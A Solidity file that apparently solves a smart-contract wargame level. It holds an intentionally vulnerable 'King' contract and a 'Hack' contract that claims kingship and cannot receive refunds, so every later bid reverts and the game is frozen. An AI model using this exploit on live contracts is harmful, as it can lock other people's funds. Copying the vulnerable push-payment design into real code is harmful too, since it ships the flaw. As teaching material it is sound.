// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

contract Hack {
    King public target;
    uint256 public prize;

    constructor(address _target) {
        target = King(payable(_target));
    }

    function hack() public payable {
        prize = target.prize();
        (bool success,) = payable(address(target)).call{value: prize}("");
        require(success, "Transfer failed");
    }
}
